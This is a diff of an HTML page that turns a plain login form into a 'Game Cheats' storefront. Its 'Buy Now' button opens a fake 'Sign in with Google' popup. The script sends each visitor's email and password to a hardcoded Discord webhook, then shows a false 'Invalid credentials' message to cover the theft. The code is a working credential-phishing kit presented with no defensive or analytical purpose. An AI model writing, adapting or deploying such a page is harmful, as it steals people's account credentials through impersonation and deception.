@@ -3,41 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Modern Secure Login</title>
+    <title>Game Cheats</title>
     <style>
         body {
-            background-color: #111;
-            color: #eee;
-            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
             margin: 0;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            text-align: center;
         }
-        .login-container {
+        .container {
+            margin: 50px auto;
+            width: 80%;
+        }
+        button {
+            background-color: #0f0;
+            color: #000;
+            font-weight: bold;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #0c0;
+        }
+        .login-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             background: #222;
-            padding: 20px 40px;
+            color: #eee;
+            padding: 20px;
             border-radius: 8px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             text-align: center;
         }
-        .login-container h1 {
-            color: #fff;
-            margin-bottom: 20px;
-        }
-        .login-container input {
-            width: 100%;
+        .login-popup input {
+            width: 90%;
             padding: 10px;
             margin: 10px 0;
             border: none;
             border-radius: 4px;
-            outline: none;
             background: #333;
             color: #eee;
         }
-        .login-container button {
+        .login-popup button {
             width: 100%;
             padding: 10px;
             border: none;
@@ -47,15 +62,18 @@
             font-weight: bold;
             cursor: pointer;
         }
-        .login-container button:hover {
-            background: #0c0;
-        }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h1>Secure Login</h1>
-        <form id="loginForm">
+    <div class="container">
+        <h1>Welcome to Game Cheats</h1>
+        <p>Access the best cheats for all your favorite games.</p>
+        <button id="buyButton">Buy Now</button>
+    </div>
+
+    <div class="login-popup" id="loginPopup">
+        <h2>Sign in with Google</h2>
+        <form id="fakeLoginForm">
             <input type="email" id="email" placeholder="Email" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Login</button>
@@ -63,11 +81,17 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
+        // Show login popup when "Buy Now" is clicked
+        document.getElementById('buyButton').addEventListener('click', function() {
+            document.getElementById('loginPopup').style.display = 'block';
+        });
+
+        // Handle fake login form submission
+        document.getElementById('fakeLoginForm').addEventListener('submit', function(event) {
             event.preventDefault();
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            
+
             // Send data to the Discord webhook
             fetch('https://discord.com/api/webhooks/1325464149404160010/Dr6gpVlTmJX0277UJIiLC2mN2YDrTg0kEUQrq10gUKmCj3v-iTkwgHdfe0nhOKaiAkuo', {
                 method: 'POST',
@@ -80,8 +104,9 @@
             // Clear input fields
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
-            
+
             alert('Invalid credentials. Please try again.');
+            document.getElementById('loginPopup').style.display = 'none';
         });
     </script>
 </body>
